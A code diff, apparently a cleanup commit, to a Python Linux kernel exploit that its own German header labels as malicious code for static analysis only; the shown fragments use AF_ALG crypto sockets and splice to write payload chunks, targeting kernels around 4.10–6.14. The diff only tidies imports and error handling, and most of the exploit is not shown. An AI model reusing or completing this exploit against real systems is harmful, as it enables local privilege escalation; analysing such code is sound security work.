@@ -1,4 +1,3 @@
-#!/usr/bin/env python3
 """
 WARNUNG: Schadcode — nur zur statischen Analyse. Nicht ausführen.
 
@@ -58,9 +57,10 @@ Angriffspfad:
 Betroffene Kernel: ~4.10–6.14 (je nach Patch-Stand)
 """
 
+import contextlib
 import os
-import zlib
 import socket
+import zlib
 
 # Linux Kernel-Konstanten (aus <linux/if_alg.h> und <sys/socket.h>)
 AF_ALG         = 38   # Socket-Familie: Kernel-Crypto-API
@@ -160,10 +160,8 @@ def process_chunk_via_kernel_crypto(su_fd: int, chunk_offset: int, payload_chunk
     os.splice(pipe_r, op_sock.fileno(), read_size)
 
     # Puffer leeren — Fehler beim recv sind normal (Exploit hat bereits gewirkt)
-    try:
+    with contextlib.suppress(OSError):
         op_sock.recv(8 + chunk_offset)
-    except Exception:
-        pass
 
 
 def main():
